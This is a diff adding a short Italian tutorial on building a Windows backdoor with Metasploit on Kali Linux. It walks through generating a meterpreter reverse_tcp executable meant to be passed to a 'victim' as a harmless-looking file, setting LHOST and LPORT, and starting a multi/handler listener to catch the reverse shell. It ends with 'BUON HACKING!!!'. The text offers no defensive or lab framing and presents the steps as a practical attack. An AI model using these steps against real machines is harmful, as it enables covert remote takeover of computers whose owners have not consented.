@@ -1,0 +1,56 @@
+*********COME CREARE UNA BACKDOOR CON METASPLOIT**********
+
+Versione di Kali Linux usata: 2.0
+
+Un backdoor è un malware che crea una "porta" tramite la quale 
+è possibile ottenere il controllo da remoto di una macchina vittima
+in quanto si stabilisce una connessione inversa, ovvero la connessione
+la instaura la vittima (molto probabilmente senza saperlo) avviando la backdoor
+credendo che sia un programma/file innocuo e si apre così una sessione fra
+il PC dell'attaccante e della vittima.
+
+Il programma utilizzato è METASPLOIT!
+
+1)Avviare metasploit dal terminale digitando "msfconsole" e premere invio.
+  Dopo qualche istante inizierà il processo di avvio del programma.
+
+2)Una volta che il programma si è avviato possiamo iniziare a creare la nostra backdoor
+andando a scegliere la tipologia di attacco.
+Digitare nel programma: "use windows/meterpreter/reverse_tcp" e premere Invio.
+
+3)Ora dobbiamo impostare quale host può rimanere in ascolto della vittima e su quale porta
+Per scoprire il proprio indirizzo IP (indirizzo logico) a livello locale basta aprire un secondo
+terminale e digitare "ifconfig" così da ottenere informazioni in merito alla scheda di rete e quindi l'IP
+
+4)Imposto l'indirizzo IP della macchina attaccante con "set LHOST  XXX.XXX.XXX.XXX" e premere Invio
+
+5)Imposto la porta dell'indirizzo IP che sarà dedicata all'attacco, l'importante è non usare porte di uso
+comune come la porta 80 di Internet e altre porte di solito utilizzo.
+
+6)Ora che abbiamo deciso che attacco utilizzare e abbiamo impostato IP e porta allora genero il file .exe
+Digito: "generate -t exe -f nomechevuoi.exe" e premi Invio
+
+Attendere qualche istante che Metasploit lavora per creare il file eseguibile che deve ricevere la vittima
+Il file che ha generato lo trovi nella directory "Home"(dove ci sono le cartelle Documenti,Musica ecc)
+
+7)Ora che abbiamo creato il file dobbiamo preoccuparci di impostare Metasploit come strumento di "ascolto" 
+sull'indirizzo che abbiamo stabilito(nostra macchina dalla quale attacchiamo,tramite IP) e su quale porta.
+Usciamo da questa fase di creazione della backdoor digitando "back" e premendo invio.
+
+8) Digitare "use exploit/multi/handler" 
+
+9)Ora devo dire a Metasploit quale tecnica deve aspettarsi quindi imposto il PAYLOAD
+Digito: "set PAYLOAD windows/meterpreter/reverse_tcp" e digito Invio
+
+10)Imposto nuovamente l'indirizzo digitando "set LHOST XXX.XXX.XXX.XXX" premere INVIO
+
+11)Imposto nuovamente la porta digitando "set LPORT stessaportadiprima" premere INVIO
+
+12)Digitare "exploit" e premere Invio
+
+Ora metasploit è in attesa che si instauiri una connessione...ovviamente ciò avverà se la vittima 
+avvierà il file correttamente e se LHOST e LPORT sono stati impostati correttamente entrambe le volte.
+
+Una volta instaurata la connessione inversa basta digitare "help" per avere una lista completa di tutti i comandi che si possono utilizzare.
+
+BUON HACKING!!! :)
